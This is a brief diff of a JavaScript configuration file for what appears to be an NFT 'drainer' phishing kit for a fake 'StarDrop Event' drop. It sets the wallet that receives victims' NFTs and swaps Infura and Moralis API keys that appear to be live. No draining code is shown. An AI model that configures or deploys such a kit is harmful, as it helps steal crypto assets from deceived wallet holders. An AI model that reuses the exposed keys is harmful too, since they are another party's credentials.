@@ -1,7 +1,7 @@
 // ⚠️ for infura & moralis, make you sure that you copy same number of characters
 const address = "0x8A10a0Ddc2F2AEcA7e3870085964e199Fff44F97";    // Your ETH wallet that you have to receive NFTs
-const infuraId = "5W4uwFhOKOzZYW15hk4afH1mGcn02KXRObedwXKX"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
-const moralisApi = "e53dc432bda847078c6d418e92982f57"    // Web3 Api key | https://moralis.io/ | For NFTs
+const infuraId = "https://mainnet.infura.io/v3/e53dc432bda847078c6d418e92982f57"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
+const moralisApi = "5W4uwFhOKOzZYW15hk4afH1mGcn02KXRObedwXKX"    // Web3 Api key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
     name: "StarDrop Event",
